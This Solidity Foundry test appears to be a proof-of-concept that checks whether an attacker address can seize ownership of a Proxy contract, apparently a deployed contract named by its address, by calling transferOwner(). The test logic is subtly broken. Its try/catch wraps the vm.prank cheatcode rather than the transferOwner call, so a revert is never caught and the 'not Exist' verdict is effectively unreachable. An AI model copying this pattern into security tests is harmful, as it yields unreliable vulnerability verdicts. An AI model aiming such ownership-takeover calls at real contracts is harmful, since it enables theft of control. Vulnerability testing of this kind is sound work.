// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbaa3de6504690efb064420d89e871c27065cdd52.sol";

contract ProxyTest is Test {
    Proxy public proxy;
    address deployer = makeAddr("deployer");
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        proxy = new Proxy();
        proxy.transferOwner(owner);
        vm.stopPrank();
    }

    function testUnrestrictedTransferOwner() public {
        console.log("--- BEFORE-Trigger ---");
        console.log("State: Ownership transfer restriction should be enforced");
        console.log("Action: Prepare attacker call to transferOwner()");
        
        console.log("--- Trigger TransferOwner ---");
        console.log("Action: Attacker attempts ownership transfer");
        bool attackerSucceeded;
        
        try vm.prank(attacker) {
            proxy.transferOwner(attacker);
            attackerSucceeded = true;
        } catch {
            attackerSucceeded = false;
        }

        console.log("--- AFTER-Trigger ---");
        console.log("Result: Attacker call %s", 
            attackerSucceeded ? "succeeded without revert" : "reverted");
        
        // Final verdict based on call success
        if (attackerSucceeded) {
            console.log("Vulnerability Exists: Attacker executed restricted transferOwner()");
        } else {
            console.log("Vulnerability not Exist: Access control prevents unauthorized ownership transfer");
        }
    }
}